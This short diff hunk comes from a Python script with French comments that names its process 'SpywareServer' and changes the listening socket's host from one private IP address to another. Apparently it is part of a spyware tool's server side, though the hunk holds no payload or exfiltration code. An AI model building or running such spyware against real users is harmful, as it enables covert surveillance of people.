@@ -248,7 +248,7 @@ if args.listen:
     setproctitle.setproctitle("SpywareServer")
     
     # Configuration du socket
-    host = '172.16.120.1'
+    host = '192.168.0.35'
     port = args.listen
 
     # création et configuration du socket
